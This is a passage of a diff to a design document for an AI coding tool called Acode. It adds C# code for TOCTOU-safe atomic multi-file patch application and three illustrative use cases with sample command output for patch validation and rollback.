+                        FailedFile = file.NewPath,
+                        Message = $"File {file.NewPath} was modified between validation and application"
+                    };
+                }
+            }
+
+            // Phase 3: Write all patched content to temp files
+            foreach (var file in patch.Files)
+            {
+                var currentContent = await _fs.ReadFileAsync(file.NewPath, ct);
+                var patchedContent = ApplyAllHunks(currentContent, file.Hunks);
+
+                var tempPath = file.NewPath + $".atomic-{Guid.NewGuid():N}.tmp";
+                await _fs.WriteFileAsync(tempPath, patchedContent, ct);
+
+                tempFiles.Add((tempPath, file.NewPath));
+            }
+
+            // Phase 4: Atomic rename all temp files to targets
+            foreach (var (tempPath, targetPath) in tempFiles)
+            {
+                await AtomicRenameAsync(tempPath, targetPath, ct);
+            }
+
+            _logger.LogInformation("Successfully applied atomic patch to {Count} files", patch.Files.Count);
+
+            return new MultiFileToctouResult { Success = true };
+        }
+        catch (Exception ex)
+        {
+            // Clean up any temp files on failure
+            foreach (var (tempPath, _) in tempFiles)
+            {
+                try { await _fs.DeleteFileAsync(tempPath, ct); }
+                catch { /* Best effort */ }
+            }
+
+            throw;
+        }
+        finally
+        {
+            // Release all locks
+            foreach (var lockHandle in locks)
+            {
+                await lockHandle.DisposeAsync();
+            }
+        }
+    }
+
+    private async Task<IAsyncDisposable> AcquireExclusiveLockAsync(
+        string filePath,
+        CancellationToken ct)
+    {
+        // Implementation depends on underlying FS
+        // For local files, use FileStream with FileShare.None
+        // For docker, use flock command
+        return await _fs.AcquireWriteLockAsync(filePath, ct);
+    }
+
+    private async Task AtomicRenameAsync(
+        string sourcePath,
+        string targetPath,
+        CancellationToken ct)
+    {
+        // File.Move with overwrite is atomic on most filesystems
+        await _fs.MoveFileAsync(sourcePath, targetPath, overwrite: true, ct);
+    }
+
+    private static byte[] ComputeHash(string content)
+    {
+        return SHA256.HashData(System.Text.Encoding.UTF8.GetBytes(content));
+    }
+
+    private string ApplyHunk(string content, PatchHunk hunk)
+    {
+        // Implementation: apply single hunk to content
+        // ... (full implementation in main PatchApplicator)
+        throw new NotImplementedException();
+    }
+
+    private string ApplyAllHunks(string content, IReadOnlyList<PatchHunk> hunks)
+    {
+        // Apply hunks in reverse order (bottom-to-top) to preserve line numbers
+        var result = content;
+        for (int i = hunks.Count - 1; i >= 0; i--)
+        {
+            result = ApplyHunk(result, hunks[i]);
+        }
+        return result;
+    }
+}
+
+public sealed class ToctouSafeResult
+{
+    public bool Success { get; init; }
+    public ToctouError Error { get; init; }
+    public string? ExpectedHash { get; init; }
+    public string? ActualHash { get; init; }
+    public Exception? Exception { get; init; }
+}
+
+public sealed class MultiFileToctouResult
+{
+    public bool Success { get; init; }
+    public ToctouError Error { get; init; }
+    public string? FailedFile { get; init; }
+    public string? Message { get; init; }
+}
+
+public enum ToctouError
+{
+    None,
+    ContentModified,
+    WriteFailed,
+    LockTimeout
+}
+
+public class PatchWriteVerificationException : Exception
+{
+    public PatchWriteVerificationException(string message) : base(message) { }
+}
+
+public class PatchValidationException : Exception
+{
+    public PatchValidationException(string message) : base(message) { }
+}
+```
+
+---
+
+---
+
+## Use Cases
+
+### Use Case 1: AI-Assisted Code Refactoring with Safety Guarantees
+
+**Persona:** David, Senior Developer at a healthcare software company
+
+**Context:** David works on a legacy EHR (Electronic Health Records) system with over 500,000 lines of C# code. He's using Acode to help refactor authentication modules across 47 files. A single corrupted file could break patient access to critical health information. He needs absolute confidence that changes are either fully applied or completely rolled back.
+
+**Before Atomic Patch Application:**
+David would ask the AI to generate code changes, then manually copy-paste each change while praying nothing went wrong mid-process. When his IDE crashed during a refactoring session, he spent 3 hours manually reviewing files to find which were partially modified. One corrupted file made it to staging and caused a critical bug blocking patient login.
+
+**After Atomic Patch Application:**
+```bash
+$ acode run "Refactor all authentication modules to use the new JWT validation service"
+
+[Planning]
+  Analyzing 47 files for authentication patterns...
+
+[Tool: apply_patch]
+  Files to modify: 47
+  Total hunks: 156
+
+  Preview summary:
+    - AuthController.cs: +45/-32 lines
+    - JwtValidator.cs: +78/-15 lines
+    - UserService.cs: +23/-18 lines
+    ... (44 more files)
+
+  Creating transaction backups...
+  Applying patch atomically...
+
+  [File 23/47: TokenHandler.cs]
+  ❌ Context mismatch at line 145
+  Expected: "private readonly ILogger _logger;"
+  Actual:   "private readonly ILogger<TokenHandler> _logger;"
+
+  ⚠ Rolling back all 22 applied files...
+  ✓ All files restored to original state
+
+[Result]
+  Status: ROLLED_BACK
+  Files modified: 0 (all rolled back)
+  Backup retained: /tmp/acode-backup-2024-01-15-143022/
+
+  Suggestion: File TokenHandler.cs was modified since analysis.
+  Run 'acode reanalyze TokenHandler.cs' to update patch.
+```
+
+**Metrics:**
+- Files protected from corruption: 47 (100%)
+- Time to recovery from failure: 0.3 seconds (automatic rollback)
+- Data integrity guarantee: 100% (no partial states possible)
+- Developer confidence: High (can attempt risky refactors safely)
+- Debugging time saved: 3+ hours per failed operation
+
+---
+
+### Use Case 2: Continuous Integration with Automated Code Fixes
+
+**Persona:** Sarah, DevOps Engineer at a fintech startup
+
+**Context:** Sarah manages CI/CD pipelines that automatically apply code style fixes, security patches, and dependency updates. When automated fixes fail partially, it can break builds for the entire team. She needs the patch system to guarantee all-or-nothing semantics for automated code modifications.
+
+**Before Atomic Patch Application:**
+The CI pipeline would apply lint fixes directly using sed commands. When the disk filled up mid-fix, half the files were modified. The resulting commit broke the build and 12 developers lost 2 hours each waiting for a fix. Sarah had to implement her own complex rollback scripts.
+
+**After Atomic Patch Application:**
+```bash
+# In CI pipeline
+$ acode apply-patches --batch security-fixes.patch style-fixes.patch dependency-updates.patch
+
+[Batch Patch Application]
+  Patches to apply: 3
+  Dry run mode: enabled (CI default)
+
+[Validating: security-fixes.patch]
+  Files: 12
+  Hunks: 34
+  Validation: ✓ PASSED
+
+[Validating: style-fixes.patch]
+  Files: 89
+  Hunks: 245
+  Validation: ✓ PASSED
+
+[Validating: dependency-updates.patch]
+  Files: 5
+  Hunks: 23
+  Conflicts detected:
+    - package.json:15 - Expected version "4.2.0", found "4.3.1"
+
+  Validation: ✗ FAILED (1 conflict)
+
+[Result]
+  Patches applied: 0
+  Reason: Pre-flight validation failed
+  Action: No files modified, build continues with original code
+
+  Recommendation: Regenerate dependency-updates.patch against current main
+```
+
+**Metrics:**
+- Build breaks from partial patches: 0 (down from 3/month)
+- Developer hours lost to partial fixes: 0 (down from 24/month)
+- Confidence in automated fixes: High (dry run catches all issues)
+- Rollback script maintenance: None (built-in)
+- Pipeline reliability: 99.9% for patch operations
+
+---
+
+### Use Case 3: Multi-File Feature Implementation with Undo Capability
+
+**Persona:** Alex, Junior Developer learning a new codebase
+
+**Context:** Alex is implementing a new feature that touches 15 files including models, services, controllers, and tests. He's using Acode to help write the code, but as a junior developer, he's not always sure the generated code is correct. He needs the ability to easily undo entire feature implementations when they don't work out.
+
+**Before Atomic Patch Application:**
+Alex would implement features file by file. When something didn't work, he'd have to manually revert each file using git or IDE history. He often forgot which files were changed and occasionally committed broken code. Senior developers spent time reviewing and fixing his partial implementations.
+
+**After Atomic Patch Application:**
+```bash
+$ acode run "Implement user notification preferences feature"
+
+[Planning]
+  Feature: User Notification Preferences
+  Files to create: 3
+  Files to modify: 12
+
+[Tool: apply_patch]
+  Transaction ID: feat-notif-pref-001
+
+  Creating: NotificationPreference.cs ✓
+  Creating: NotificationPreferenceService.cs ✓
+  Creating: NotificationPreferenceController.cs ✓
+  Modifying: User.cs (+3 lines) ✓
+  Modifying: UserService.cs (+45 lines) ✓
+  ... (10 more files) ✓
+
+  All 15 files modified successfully.
+  Backup retained for 60 minutes.
+
+  Transaction ID: feat-notif-pref-001 (use for rollback)
+
+# Alex tests the feature and finds it doesn't integrate correctly
+
+$ acode rollback feat-notif-pref-001
+
+[Rollback]
+  Transaction: feat-notif-pref-001
+  Files to restore: 15
+
+  Deleting created file: NotificationPreference.cs ✓
+  Deleting created file: NotificationPreferenceService.cs ✓
+  Deleting created file: NotificationPreferenceController.cs ✓
+  Restoring: User.cs ✓
+  Restoring: UserService.cs ✓
+  ... (10 more files) ✓
+
+  All files restored to pre-feature state.
+  Ready for fresh implementation attempt.
+```
+
+**Metrics:**
+- Confidence to attempt complex features: High (can always undo)
+- Time spent on manual reverts: 0 (down from 30min per failed attempt)
+- Partial commits of broken features: 0
+- Learning velocity: Increased 40% (safe to experiment)
+- Senior developer review time: Reduced 50% (fewer broken states to fix)
+
+---
 
 | Term | Definition |
 |------|------------|
